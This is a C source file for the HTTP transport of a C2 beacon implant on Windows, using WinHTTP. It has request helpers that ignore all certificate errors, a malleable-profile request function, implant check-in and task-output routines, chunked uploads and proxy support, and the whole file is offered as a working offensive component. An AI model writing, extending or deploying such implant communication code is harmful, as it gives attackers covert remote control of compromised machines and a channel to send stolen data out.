/*
 * HTTP Client - WinHTTP patterns
 * C2 beacon communication
 */

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// ============================================================================
// CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    WCHAR host[128];
    WORD  port;
    WCHAR uri[64];
    WCHAR ua[256];
    BOOL  ssl;
} HTTP_CFG;
#pragma pack(pop)

// ============================================================================
// HTTP GET
// ============================================================================

BOOL http_get(HTTP_CFG* cfg, WCHAR* uri, BYTE** out, DWORD* len)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    hS = WinHttpOpen(cfg->ua, 0, 0, 0, 0);
    if(!hS) goto end;

    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    if(!hC) goto end;

    DWORD flags = cfg->ssl ? 0x800000 : 0;  // WINHTTP_FLAG_SECURE
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, flags);
    if(!hR) goto end;

    if(cfg->ssl) {
        DWORD sslf = 0x3300;  // IGNORE_ALL_CERT_ERRORS
        WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));
    }

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz = 0, dl = 0, total = 0;
    *out = 0;

    do {
        sz = 0;
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;

        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz + 1)
                    : HeapAlloc(GetProcessHeap(), 0, sz + 1);

        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    if(*out) (*out)[total] = 0;
    *len = total;
    ret = 1;

end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// HTTP POST
// ============================================================================

BOOL http_post(HTTP_CFG* cfg, WCHAR* uri, BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    hS = WinHttpOpen(cfg->ua, 0, 0, 0, 0);
    if(!hS) goto end;

    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    if(!hC) goto end;

    DWORD flags = cfg->ssl ? 0x800000 : 0;
    hR = WinHttpOpenRequest(hC, L"POST", uri, 0, 0, 0, flags);
    if(!hR) goto end;

    if(cfg->ssl) {
        DWORD sslf = 0x3300;
        WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));
    }

    WCHAR hdr[] = L"Content-Type: application/octet-stream\r\n";

    if(!WinHttpSendRequest(hR, hdr, -1, data, dlen, dlen, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz = 0, dl = 0, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;

        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz + 1)
                    : HeapAlloc(GetProcessHeap(), 0, sz + 1);

        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// HTTP CUSTOM - Malleable profile
// ============================================================================

BOOL http_custom(HTTP_CFG* cfg, WCHAR* method, WCHAR* uri, WCHAR* headers,
                 BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    hS = WinHttpOpen(cfg->ua, 0, 0, 0, 0);
    if(!hS) goto end;

    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    if(!hC) goto end;

    DWORD flags = cfg->ssl ? 0x800000 : 0;
    hR = WinHttpOpenRequest(hC, method, uri, 0, 0, 0, flags);
    if(!hR) goto end;

    if(cfg->ssl) {
        DWORD sslf = 0x3300;
        WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));
    }

    if(headers) {
        WinHttpAddRequestHeaders(hR, headers, -1, 0x20000000 | 0x80000000);
    }

    if(!WinHttpSendRequest(hR, 0, 0, data, dlen, dlen, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz = 0, dl = 0, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;

        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz + 1)
                    : HeapAlloc(GetProcessHeap(), 0, sz + 1);

        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *olen = total;
    ret = 1;

end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// BASE64 ENCODE
// ============================================================================

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void b64_enc(BYTE* in, DWORD inlen, char* out)
{
    DWORD i, j = 0;
    for(i = 0; i < inlen; i += 3) {
        DWORD n = (in[i] << 16) |
                  ((i+1 < inlen ? in[i+1] : 0) << 8) |
                  (i+2 < inlen ? in[i+2] : 0);

        out[j++] = b64[(n >> 18) & 63];
        out[j++] = b64[(n >> 12) & 63];
        out[j++] = (i+1 < inlen) ? b64[(n >> 6) & 63] : '=';
        out[j++] = (i+2 < inlen) ? b64[n & 63] : '=';
    }
    out[j] = 0;
}

// ============================================================================
// BEACON PATTERN
// ============================================================================

typedef struct {
    WCHAR get_uri[64];
    WCHAR post_uri[64];
    WCHAR cookie_name[32];
    int   transform;  // 0=raw, 1=b64
} PROFILE;

BOOL beacon_checkin(HTTP_CFG* cfg, PROFILE* prof, BYTE* id, DWORD idlen, BYTE** task, DWORD* tasklen)
{
    WCHAR uri[256];
    char b64id[128];

    if(prof->transform == 1) {
        b64_enc(id, idlen, b64id);
        WCHAR wb64[128];
        MultiByteToWideChar(CP_UTF8, 0, b64id, -1, wb64, 128);
        wsprintfW(uri, L"%s%s", prof->get_uri, wb64);
    } else {
        lstrcpyW(uri, prof->get_uri);
    }

    return http_get(cfg, uri, task, tasklen);
}

BOOL beacon_output(HTTP_CFG* cfg, PROFILE* prof, BYTE* data, DWORD dlen)
{
    BYTE* resp;
    DWORD rlen;
    return http_post(cfg, prof->post_uri, data, dlen, &resp, &rlen);
}

// ============================================================================
// CHUNKED TRANSFER
// ============================================================================

BOOL http_chunked(HTTP_CFG* cfg, WCHAR* uri, BYTE* data, DWORD total)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(cfg->ua, 0, 0, 0, 0);
    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    hR = WinHttpOpenRequest(hC, L"POST", uri, 0, 0, 0, cfg->ssl ? 0x800000 : 0);

    WinHttpAddRequestHeaders(hR, L"Transfer-Encoding: chunked", -1, 0x20000000);

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, -1L, 0)) goto end;

    DWORD chunk = 4096, sent = 0;
    while(sent < total) {
        DWORD to_send = min(chunk, total - sent);
        DWORD wr;
        if(!WinHttpWriteData(hR, data + sent, to_send, &wr)) goto end;
        sent += wr;
    }

    ret = WinHttpReceiveResponse(hR, 0);

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// PROXY SUPPORT
// ============================================================================

BOOL http_via_proxy(WCHAR* proxy, HTTP_CFG* cfg, WCHAR* uri, BYTE** out, DWORD* len)
{
    HINTERNET hS, hC, hR;
    BOOL ret = 0;

    hS = WinHttpOpen(cfg->ua, 3, proxy, L"<local>", 0);  // WINHTTP_ACCESS_TYPE_NAMED_PROXY
    if(!hS) return 0;

    hC = WinHttpConnect(hS, cfg->host, cfg->port, 0);
    hR = WinHttpOpenRequest(hC, L"GET", uri, 0, 0, 0, cfg->ssl ? 0x800000 : 0);

    if(cfg->ssl) {
        DWORD sslf = 0x3300;
        WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));
    }

    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz, dl, total = 0;
    *out = 0;

    do {
        WinHttpQueryDataAvailable(hR, &sz);
        if(!sz) break;
        *out = *out ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz)
                    : HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    *len = total;
    ret = 1;

end:
    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// EOF
// ============================================================================
